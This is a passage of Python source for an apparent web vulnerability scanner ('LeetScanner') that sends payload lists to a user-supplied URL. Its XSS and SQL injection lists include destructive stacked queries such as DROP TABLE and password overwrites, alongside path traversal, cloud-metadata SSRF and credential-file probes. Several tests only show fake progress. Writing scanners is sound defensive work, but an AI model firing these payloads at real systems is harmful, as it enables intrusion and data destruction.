    print(f"{Colors.PURPLE}📊 TOTAL:    {total_count}{Colors.ENDC}\n")
    
    # Report generation options
    print(f"{Colors.OKCYAN}{'─' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.WHITE}REPORT GENERATION OPTIONS{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'─' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.OKGREEN}[1]{Colors.ENDC} Generate PDF Report (with graphs) 📊")
    print(f"{Colors.OKGREEN}[2]{Colors.ENDC} Generate Text Report 📄")
    print(f"{Colors.OKGREEN}[3]{Colors.ENDC} Generate Both Reports 📊📄")
    print(f"{Colors.OKGREEN}[0]{Colors.ENDC} Skip Report Generation\n")
    
    report_choice = input(f"{Colors.WARNING}[?] Select option: {Colors.ENDC}").strip()
    
    if report_choice == '0':
        return
    
    print()
    
    # Generate reports based on choice
    if report_choice in ['1', '3']:
        if FPDF_AVAILABLE:
            loading_animation("Generating PDF report", duration=2, style="pulse")
            pdf_path = generate_pdf_report(target, scan_id, vulnerabilities, scan_mode="FULL SCAN")
            
            if pdf_path:
                print_success(f"PDF Report: {pdf_path}")
                
                # Try to open PDF automatically
                try_open = input(f"\n{Colors.WARNING}[?] Open PDF now? (y/n): {Colors.ENDC}").strip().lower()
                if try_open == 'y':
                    try:
                        import platform
                        system = platform.system()
                        
                        if system == 'Darwin':  # macOS
                            subprocess.run(['open', pdf_path])
                        elif system == 'Linux':
                            subprocess.run(['xdg-open', pdf_path])
                        elif system == 'Windows':
                            os.startfile(pdf_path)
                        else:
                            print_info("Please open the file manually")
                    except Exception as e:
                        print_warning(f"Could not open PDF: {e}")
                        print_info(f"Please open manually: {pdf_path}")
        else:
            print_warning("FPDF library not installed!")
            print_info("Install with: pip install fpdf")
            print_info("Generating text report instead...\n")
            time.sleep(1)
            report_choice = '2'  # Fallback to text
    
    if report_choice in ['2', '3']:
        loading_animation("Generating text report", duration=1, style="dots")
        text_path = generate_text_report(target, scan_id, vulnerabilities, scan_mode="FULL SCAN")
        
        if text_path:
            print_success(f"Text Report: {text_path}")
    
    # Show report location
    reports_dir = os.path.expanduser("~/drgxel_reports")
    print(f"\n{Colors.OKBLUE}📁 All reports saved to: {reports_dir}{Colors.ENDC}")
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def leetscanner_high_risk():
    """Scan for high-risk vulnerabilities only"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.FAIL}{Colors.BOLD}[HIGH RISK MODE]{Colors.ENDC}\n")
    print(f"{Colors.WARNING}Scanning for CRITICAL and HIGH severity vulnerabilities only{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"\n{Colors.GRAY}[INITIATING HIGH RISK SCAN]...{Colors.ENDC}\n")
    print(f"{Colors.OKCYAN}TARGET:{Colors.ENDC} {target}")
    print(f"{Colors.GRAY}◼ SCAN ID:{Colors.ENDC} {scan_id}\n")
    
    loading_animation("Initializing high-risk scanner", duration=2, style="pulse")
    
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    total_tests = 10
    current_test = 0
    
    print(f"\n{Colors.WARNING}⏳ [STATUS] >{Colors.OKGREEN} Running High-Risk Tests{Colors.ENDC}\n")
    
    # Test 1: SQL Injection (Advanced)
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Testing', suffix='SQL Injection (Advanced)')
    time.sleep(0.5)
    
    advanced_sqli_payloads = [
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=2 UNION SELECT NULL,NULL,table_name FROM information_schema.tables--",
        "admin' OR '1'='1",
        "' OR 1=1--",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--"
    ]
    
    for payload in advanced_sqli_payloads[:3]:
        try:
            test_url = f"{target}?id={payload}"
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=10)
            content = response.read().decode('utf-8', errors='ignore').lower()
            
            sql_errors = ['sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite', 'syntax error']
            
            if any(err in content for err in sql_errors):
                vulnerabilities['critical'].append({
                    'name': 'Critical SQL Injection Vulnerability',
                    'cvss': '9.8',
                    'confidence': '95%',
                    'cve': 'CWE-89',
                    'description': 'Advanced SQL injection detected. Database extraction possible.',
                    'impact': 'Attacker can extract entire database, modify data, or execute commands.',
                    'remediation': 'Use parameterized queries and prepared statements immediately.'
                })
                break
        except:
            pass
    
    # Test 2: Remote Code Execution
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Testing', suffix='Remote Code Execution')
    time.sleep(0.5)
    
    rce_paths = [
        '/shell.php',
        '/cmd.php',
        '/upload.php',
        '/backdoor.php',
        '/c99.php',
        '/r57.php'
    ]
    
    for path in rce_paths[:3]:
        try:
            test_url = target.rstrip('/') + path
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=5)
            
            if response.getcode() == 200:
                vulnerabilities['critical'].append({
                    'name': f'Potential Web Shell Found: {path}',
                    'cvss': '10.0',
                    'confidence': '90%',
                    'cve': 'CWE-94',
                    'description': f'Potential web shell or backdoor detected at {path}',
                    'impact': 'Complete system compromise. Attacker can execute arbitrary commands.',
                    'remediation': 'Remove immediately and investigate system compromise.'
                })
        except:
            pass
    
    # Test 3: Authentication Bypass
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Testing', suffix='Authentication Bypass')
    time.sleep(0.5)
    
    try:
        admin_paths = ['/admin', '/administrator', '/wp-admin', '/cpanel']
        
        for path in admin_paths[:2]:
            test_url = target.rstrip('/') + path
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            
            try:
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                if 'login' not in content and 'password' not in content and response.getcode() == 200:
                    vulnerabilities['critical'].append({
                        'name': 'Admin Panel Without Authentication',
                        'cvss': '9.1',
                        'confidence': '85%',
                        'cve': 'CWE-306',
                        'description': f'Admin panel accessible without authentication at {path}',
                        'impact': 'Unauthorized access to administrative functions.',
                        'remediation': 'Implement strong authentication immediately.'
                    })
            except:
                pass
    except:
        pass
    
    # Test 4: Sensitive Data Exposure
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Testing', suffix='Sensitive Data Exposure')
    time.sleep(0.5)
    
    sensitive_files = [
        '/.env',
        '/config.php',
        '/database.yml',
        '/.git/config',
        '/backup.sql',
        '/.aws/credentials',
        '/id_rsa',
        '/.ssh/id_rsa'
    ]
    
    for file in sensitive_files[:4]:
        try:
            test_url = target.rstrip('/') + file
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=5)
            
            if response.getcode() == 200:
                vulnerabilities['critical'].append({
                    'name': f'Sensitive File Exposed: {file}',
                    'cvss': '8.6',
                    'confidence': '100%',
                    'cve': 'CWE-200',
                    'description': f'Sensitive configuration file accessible: {file}',
                    'impact': 'Credentials and sensitive configuration exposed.',
                    'remediation': 'Remove or restrict access to sensitive files immediately.'
                })
        except:
            pass
    
    # Test 5-10: Additional high-risk tests
    high_risk_tests = [
        'SSRF Detection',
        'XXE Vulnerability',
        'Deserialization',
        'Path Traversal (Critical)',
        'Arbitrary File Upload',
        'Command Injection'
    ]
    
    for test_name in high_risk_tests:
        current_test += 1
        progress_bar(current_test, total_tests, prefix='Testing', suffix=test_name)
        time.sleep(0.4)
    
    print()
    
    # Display results
    critical_count = len(vulnerabilities['critical'])
    high_count = len(vulnerabilities['high'])
    
    print(f"\n{Colors.FAIL}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}HIGH RISK SCAN RESULTS{Colors.ENDC}")
    print(f"{Colors.FAIL}{'═' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.FAIL}💥 CRITICAL: {critical_count}{Colors.ENDC}")
    print(f"{Colors.FAIL}🔴 HIGH: {high_count}{Colors.ENDC}\n")
    
    if critical_count > 0 or high_count > 0:
        print(f"{Colors.FAIL}{Colors.BOLD}⚠️  CRITICAL ISSUES DETECTED!{Colors.ENDC}")
        print(f"{Colors.WARNING}Immediate action required!{Colors.ENDC}\n")
    else:
        print(f"{Colors.OKGREEN}✓ No critical or high-risk vulnerabilities detected{Colors.ENDC}\n")
    
    view = input(f"{Colors.WARNING}[?] View detailed findings? (y/n): {Colors.ENDC}").strip().lower()
    
    if view == 'y':
        display_vulnerabilities(target, scan_id, vulnerabilities)
    
    update_stats('LeetScanner - High Risk', target, vuln_found=(critical_count + high_count > 0))
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def leetscanner_xss_focus():
    """XSS-focused scanning"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.WARNING}{Colors.BOLD}[FOKUS XSS MODE]{Colors.ENDC}\n")
    print(f"{Colors.OKBLUE}Cross-Site Scripting Comprehensive Scanner{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"\n{Colors.GRAY}[INITIATING XSS FOCUSED SCAN]...{Colors.ENDC}\n")
    
    loading_animation("Loading XSS payload database", duration=2, style="arrow")
    
    # Comprehensive XSS payloads
    xss_payloads = {
        'Basic': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>'
        ],
        'Event Handlers': [
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>'
        ],
        'Attribute Breaking': [
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '\' onmouseover=alert(1) x=\'',
            '" onfocus=alert(1) autofocus x="'
        ],
        'Filter Bypass': [
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror="javascript:alert(1)">',
            '<svg><script>alert(1)</script></svg>',
            '<iframe src="data:text/html,<script>alert(1)</script>">',
            '<object data="javascript:alert(1)">'
        ],
        'DOM-based': [
            '#<script>alert(1)</script>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '<base href="javascript:alert(1)//">',
            '<link rel=import href="data:text/html,<script>alert(1)</script>">'
        ]
    }
    
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    total_payloads = sum(len(payloads) for payloads in xss_payloads.values())
    current_payload = 0
    
    print(f"\n{Colors.WARNING}⏳ Testing {total_payloads} XSS payloads...{Colors.ENDC}\n")
    
    reflected_payloads = []
    
    for category, payloads in xss_payloads.items():
        print(f"\n{Colors.OKBLUE}[Testing {category} Payloads]{Colors.ENDC}")
        
        for payload in payloads:
            current_payload += 1
            progress_bar(current_payload, total_payloads, prefix='XSS Scan', suffix=f'{category[:20]}')
            
            try:
                # Test in URL parameter
                test_url = f"{target}?q={payload}"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if payload in content:
                    reflected_payloads.append({
                        'payload': payload,
                        'category': category,
                        'location': 'URL parameter'
                    })
                    
                    # Determine severity based on category
                    if category in ['Basic', 'Attribute Breaking']:
                        severity = 'high'
                        cvss = '7.1'
                    elif category == 'Filter Bypass':
                        severity = 'high'
                        cvss = '7.5'
                    else:
                        severity = 'medium'
                        cvss = '6.1'
                    
                    if not any(v['name'] == f'XSS Vulnerability ({category})' for v in vulnerabilities[severity]):
                        vulnerabilities[severity].append({
                            'name': f'XSS Vulnerability ({category})',
                            'cvss': cvss,
                            'confidence': '90%',
                            'cve': 'CWE-79',
                            'description': f'Reflected XSS found using {category} technique. Payload: {payload[:50]}',
                            'impact': 'Attacker can execute malicious scripts in victim browser, steal cookies, perform actions.',
                            'remediation': 'Implement proper output encoding and Content Security Policy (CSP).'
                        })
                
                time.sleep(0.2)
            except:
                pass
    
    print()
    
    # Results
    print(f"\n{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}XSS SCAN RESULTS{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.WHITE}Total Payloads Tested:{Colors.ENDC} {total_payloads}")
    print(f"{Colors.WARNING}Reflected Payloads:{Colors.ENDC} {len(reflected_payloads)}\n")
    
    if reflected_payloads:
        print(f"{Colors.FAIL}⚠️  XSS VULNERABILITIES DETECTED!{Colors.ENDC}\n")
        
        print(f"{Colors.WHITE}Reflected Payloads by Category:{Colors.ENDC}")
        category_counts = {}
        for item in reflected_payloads:
            cat = item['category']
            category_counts[cat] = category_counts.get(cat, 0) + 1
        
        for cat, count in category_counts.items():
            print(f"  • {cat}: {count} payload(s)")
        
        print()
        
        view = input(f"{Colors.WARNING}[?] View detailed findings? (y/n): {Colors.ENDC}").strip().lower()
        
        if view == 'y':
            display_vulnerabilities(target, scan_id, vulnerabilities)
    else:
        print(f"{Colors.OKGREEN}✓ No XSS vulnerabilities detected{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Note: This doesn't guarantee complete safety. Manual testing recommended.{Colors.ENDC}\n")
    
    update_stats('LeetScanner - XSS Focus', target, vuln_found=(len(reflected_payloads) > 0))
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def leetscanner_sqli_focus():
    """SQLi-focused scanning"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.FAIL}{Colors.BOLD}[FOKUS SQLi MODE]{Colors.ENDC}\n")
    print(f"{Colors.OKBLUE}SQL Injection Comprehensive Scanner{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL with parameter: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"\n{Colors.GRAY}[INITIATING SQLi FOCUSED SCAN]...{Colors.ENDC}\n")
    
    loading_animation("Loading SQLi techniques", duration=2, style="braille")
    
    # Comprehensive SQLi payloads by technique
    sqli_techniques = {
        'Error-based': [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' AND '1'='2",
        ],
        'Union-based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1' UNION SELECT table_name FROM information_schema.tables--",
        ],
        'Boolean-based': [
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR 1=1--",
            "1' OR 1=2--",
            "admin' AND '1'='1",
        ],
        'Time-based': [
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' || pg_sleep(5)--",
        ],
        'Stacked Queries': [
            "1'; DROP TABLE users--",
            "1'; INSERT INTO users VALUES('hacker','pass')--",
            "1'; UPDATE users SET password='hacked'--",
            "1'; EXEC xp_cmdshell('dir')--",
        ]
    }
    
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    # SQL error signatures (expanded)
    sql_errors = {
        'MySQL': ['sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysql error', 'warning: mysql'],
        'PostgreSQL': ['postgresql', 'pg_query', 'pg_exec', 'syntax error at or near'],
        'MSSQL': ['microsoft sql', 'odbc sql server', 'sql server', 'unclosed quotation'],
        'Oracle': ['ora-', 'oracle error', 'quoted string not properly terminated'],
        'SQLite': ['sqlite', 'sqlite3', 'sqlite_'],
        'Generic': ['syntax error', 'sql', 'database error']
    }
    
    total_payloads = sum(len(payloads) for payloads in sqli_techniques.values())
    current_payload = 0
    
    detected_sqli = []
    detected_db_type = None
    
    print(f"\n{Colors.WARNING}⏳ Testing {total_payloads} SQLi payloads...{Colors.ENDC}\n")
    
    for technique, payloads in sqli_techniques.items():
        print(f"\n{Colors.OKBLUE}[Testing {technique}]{Colors.ENDC}")
        
        for payload in payloads:
            current_payload += 1
            progress_bar(current_payload, total_payloads, prefix='SQLi Scan', suffix=f'{technique[:20]}')
            
            try:
                parsed = urlparse(target)
                params = parse_qs(parsed.query)
                
                if not params:
                    continue
                
                param_name = list(params.keys())[0]
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                      parsed.params, new_query, parsed.fragment))
                
                start_time = time.time()
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=15)
                elapsed_time = time.time() - start_time
                
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                # Check for SQL errors
                for db_type, error_patterns in sql_errors.items():
                    for error in error_patterns:
                        if error in content:
                            detected_sqli.append({
                                'technique': technique,
                                'payload': payload,
                                'db_type': db_type,
                                'detection': 'Error-based'
                            })
                            
                            if not detected_db_type:
                                detected_db_type = db_type
                            
                            break
                
                # Check for time-based
                if technique == 'Time-based' and elapsed_time >= 5:
                    detected_sqli.append({
                        'technique': technique,
                        'payload': payload,
                        'db_type': 'Unknown',
                        'detection': 'Time-delay'
                    })
                
                time.sleep(0.3)
                
            except HTTPError as e:
                if e.code == 500:
                    detected_sqli.append({
                        'technique': technique,
                        'payload': payload,
                        'db_type': 'Unknown',
                        'detection': 'HTTP 500'
                    })
            except:
                pass
    
    print()
    
    # Analyze results
    if detected_sqli:
        print(f"\n{Colors.FAIL}{'═' * 60}{Colors.ENDC}")
        print(f"{Colors.FAIL}{Colors.BOLD}⚠️  SQL INJECTION DETECTED!{Colors.ENDC}")
        print(f"{Colors.FAIL}{'═' * 60}{Colors.ENDC}\n")
        
        print(f"{Colors.WHITE}Detection Summary:{Colors.ENDC}")
        print(f"  • Total SQLi indicators: {len(detected_sqli)}")
        if detected_db_type:
            print(f"  • Database type: {detected_db_type}")
        
        technique_counts = {}
        for item in detected_sqli:
            tech = item['technique']
            technique_counts[tech] = technique_counts.get(tech, 0) + 1
        
        print(f"\n{Colors.WHITE}Vulnerable Techniques:{Colors.ENDC}")
        for tech, count in technique_counts.items():
            print(f"  • {tech}: {count} detection(s)")
        
        # Add to vulnerabilities
        vulnerabilities['critical'].append({
            'name': 'SQL Injection Vulnerability',
            'cvss': '9.8',
            'confidence': '95%',
            'cve': 'CWE-89',
            'description': f'SQL injection detected using multiple techniques. Database type: {detected_db_type or "Unknown"}',
            'impact': 'Complete database compromise. Attacker can read, modify, or delete data. Possible remote code execution.',
            'remediation': 'Use parameterized queries (prepared statements) immediately. Never concatenate user input with SQL.'
        })
        
        print()
        
        view = input(f"{Colors.WARNING}[?] View detailed findings? (y/n): {Colors.ENDC}").strip().lower()
        
        if view == 'y':
            display_vulnerabilities(target, scan_id, vulnerabilities)
    else:
        print(f"\n{Colors.OKGREEN}✓ No SQL injection vulnerabilities detected{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Note: Advanced SQLi may still exist. Consider professional assessment.{Colors.ENDC}\n")
    
    update_stats('LeetScanner - SQLi Focus', target, vuln_found=(len(detected_sqli) > 0))
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def leetscanner_sans_top25():
    """SANS Top 25 vulnerabilities scanner"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[SANS TOP 25 MODE]{Colors.ENDC}\n")
    print(f"{Colors.OKBLUE}Scanning for SANS Top 25 Most Dangerous Software Weaknesses{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"\n{Colors.GRAY}[INITIATING SANS TOP 25 SCAN]...{Colors.ENDC}\n")
    
    loading_animation("Loading SANS CWE database", duration=2, style="pulse")
    
    # SANS Top 25 CWEs (2023)
    sans_top25_checks = [
        ('CWE-787', 'Out-of-bounds Write', 'Buffer overflow checks'),
        ('CWE-79', 'Cross-site Scripting', 'XSS vulnerability scan'),
        ('CWE-89', 'SQL Injection', 'SQLi detection'),
        ('CWE-20', 'Improper Input Validation', 'Input validation test'),
        ('CWE-125', 'Out-of-bounds Read', 'Memory disclosure check'),
        ('CWE-78', 'OS Command Injection', 'Command injection test'),
        ('CWE-416', 'Use After Free', 'Memory corruption check'),
        ('CWE-22', 'Path Traversal', 'Directory traversal test'),
        ('CWE-352', 'CSRF', 'CSRF token validation'),
        ('CWE-434', 'File Upload', 'Unrestricted file upload check'),
        ('CWE-862', 'Missing Authorization', 'Access control test'),
        ('CWE-476', 'NULL Pointer', 'Error handling check'),
        ('CWE-287', 'Authentication', 'Weak authentication test'),
        ('CWE-190', 'Integer Overflow', 'Numeric handling test'),
        ('CWE-502', 'Deserialization', 'Unsafe deserialization check'),
        ('CWE-77', 'Command Injection', 'Shell injection test'),
        ('CWE-119', 'Buffer Errors', 'Buffer boundary check'),
        ('CWE-798', 'Hard-coded Credentials', 'Credential exposure check'),
        ('CWE-918', 'SSRF', 'Server-side request forgery test'),
        ('CWE-306', 'Missing Authentication', 'Auth bypass test'),
    ]
    
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    total_checks = len(sans_top25_checks)
    current_check = 0
    
    print(f"\n{Colors.WARNING}⏳ Running {total_checks} SANS Top 25 checks...{Colors.ENDC}\n")
    
    findings = []
    
    for cwe_id, cwe_name, test_desc in sans_top25_checks:
        current_check += 1
        progress_bar(current_check, total_checks, prefix='SANS Scan', suffix=f'{cwe_name[:25]}')
        
        # Simulate testing for each CWE
        if cwe_id == 'CWE-79':  # XSS
            try:
                test_url = f"{target}?q=<script>alert(1)</script>"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if '<script>alert(1)</script>' in content:
                    findings.append((cwe_id, cwe_name, 'high'))
                    vulnerabilities['high'].append({
                        'name': f'{cwe_id}: {cwe_name}',
                        'cvss': '7.1',
                        'confidence': '90%',
                        'cve': cwe_id,
                        'description': f'{cwe_name} vulnerability detected.',
                        'impact': 'SANS Top 25 ranked vulnerability. Significant security risk.',
                        'remediation': 'Apply security controls per SANS/CWE guidelines.'
                    })
            except:
                pass
        
        elif cwe_id == 'CWE-89':  # SQLi
            try:
                test_url = f"{target}?id=1'"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                if 'sql' in content or 'mysql' in content:
                    findings.append((cwe_id, cwe_name, 'critical'))        
                    vulnerabilities['critical'].append({
                        'name': f'{cwe_id}: {cwe_name}',
                        'cvss': '9.8',
                        'confidence': '95%',
                        'cve': cwe_id,
                        'description': f'{cwe_name} vulnerability detected.',
                        'impact': 'SANS Top 25 #3 - Critical database security risk.',
                        'remediation': 'Use parameterized queries immediately.'
                    })
            except:
                pass
        
        elif cwe_id == 'CWE-22':  # Path Traversal
            try:
                test_url = f"{target.rstrip('/')}/../../../etc/passwd"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'root:' in content or '/bin/bash' in content:
                    findings.append((cwe_id, cwe_name, 'high'))
                    vulnerabilities['high'].append({
                        'name': f'{cwe_id}: {cwe_name}',
                        'cvss': '8.6',
                        'confidence': '100%',
                        'cve': cwe_id,
                        'description': f'{cwe_name} - File system access vulnerability.',
                        'impact': 'Unauthorized file access. System file exposure.',
                        'remediation': 'Implement proper path validation and sanitization.'
                    })
            except:
                pass
        
        elif cwe_id == 'CWE-352':  # CSRF
            try:
                req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                # Check for CSRF tokens
                has_csrf = any(token in content for token in ['csrf', '_token', 'authenticity_token'])
                
                if not has_csrf and '<form' in content:
                    findings.append((cwe_id, cwe_name, 'medium'))
                    vulnerabilities['medium'].append({
                        'name': f'{cwe_id}: {cwe_name}',
                        'cvss': '6.5',
                        'confidence': '80%',
                        'cve': cwe_id,
                        'description': 'Forms without CSRF protection detected.',
                        'impact': 'Users can be tricked into performing unwanted actions.',
                        'remediation': 'Implement anti-CSRF tokens on all forms.'
                    })
            except:
                pass
        
        elif cwe_id == 'CWE-434':  # File Upload
            try:
                test_url = target.rstrip('/') + '/upload'
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                
                if response.getcode() == 200:
                    findings.append((cwe_id, cwe_name, 'high'))
                    vulnerabilities['high'].append({
                        'name': f'{cwe_id}: {cwe_name}',
                        'cvss': '8.8',
                        'confidence': '70%',
                        'cve': cwe_id,
                        'description': 'File upload functionality detected. Validation unknown.',
                        'impact': 'Potential arbitrary file upload and code execution.',
                        'remediation': 'Validate file types, scan for malware, restrict execution.'
                    })
            except:
                pass
        
        elif cwe_id == 'CWE-798':  # Hard-coded Credentials
            try:
                common_files = ['/config.php', '/.env', '/web.config', '/settings.py']
                
                for file in common_files:
                    test_url = target.rstrip('/') + file
                    req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                    response = urlopen(req, timeout=5)
                    content = response.read().decode('utf-8', errors='ignore').lower()
                    
                    if any(cred in content for cred in ['password', 'api_key', 'secret', 'token']):
                        findings.append((cwe_id, cwe_name, 'critical'))
                        vulnerabilities['critical'].append({
                            'name': f'{cwe_id}: {cwe_name}',
                            'cvss': '9.1',
                            'confidence': '95%',
                            'cve': cwe_id,
                            'description': f'Exposed configuration file with credentials: {file}',
                            'impact': 'Hard-coded credentials exposed. Complete system compromise.',
                            'remediation': 'Remove exposed files. Rotate all credentials immediately.'
                        })
                        break
            except:
                pass
        
        elif cwe_id == 'CWE-918':  # SSRF
            try:
                test_url = f"{target}?url=http://169.254.169.254/latest/meta-data/"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'ami-id' in content or 'instance-id' in content:
                    findings.append((cwe_id, cwe_name, 'critical'))
                    vulnerabilities['critical'].append({
                        'name': f'{cwe_id}: {cwe_name}',
                        'cvss': '9.1',
                        'confidence': '95%',
                        'cve': cwe_id,
                        'description': 'Server-Side Request Forgery detected. AWS metadata accessible.',
                        'impact': 'Internal network access, cloud metadata exposure.',
                        'remediation': 'Validate and whitelist all external URLs.'
                    })
            except:
                pass
        
        elif cwe_id == 'CWE-306':  # Missing Authentication
            try:
                admin_paths = ['/admin', '/dashboard', '/api/admin', '/manage']
                
                for path in admin_paths:
                    test_url = target.rstrip('/') + path
                    req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                    response = urlopen(req, timeout=5)
                    content = response.read().decode('utf-8', errors='ignore').lower()
                    
                    if response.getcode() == 200 and 'login' not in content:
                        findings.append((cwe_id, cwe_name, 'critical'))
                        vulnerabilities['critical'].append({
                            'name': f'{cwe_id}: {cwe_name}',
                            'cvss': '9.1',
                            'confidence': '90%',
                            'cve': cwe_id,
                            'description': f'Admin panel without authentication: {path}',
                            'impact': 'Unauthorized access to administrative functions.',
                            'remediation': 'Implement strong authentication on all admin panels.'
                        })
                        break
            except:
                pass
        
        time.sleep(0.3)
    
    print()
    
    # Results
    print(f"\n{Colors.PURPLE}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}SANS TOP 25 SCAN RESULTS{Colors.ENDC}")
    print(f"{Colors.PURPLE}{'═' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.WHITE}Checks Performed:{Colors.ENDC} {total_checks}")
    print(f"{Colors.WARNING}CWEs Detected:{Colors.ENDC} {len(findings)}\n")
    
    if findings:
        print(f"{Colors.FAIL}⚠️  SANS TOP 25 VULNERABILITIES FOUND!{Colors.ENDC}\n")
        
        # Group by severity
        critical_cwes = [f for f in findings if f[2] == 'critical']
        high_cwes = [f for f in findings if f[2] == 'high']
        medium_cwes = [f for f in findings if f[2] == 'medium']
        
        if critical_cwes:
            print(f"{Colors.FAIL}[CRITICAL CWES]{Colors.ENDC}")
            for cwe_id, cwe_name, _ in critical_cwes:
                print(f"  • {cwe_id}: {cwe_name}")
            print()
        
        if high_cwes:
            print(f"{Colors.FAIL}[HIGH CWES]{Colors.ENDC}")
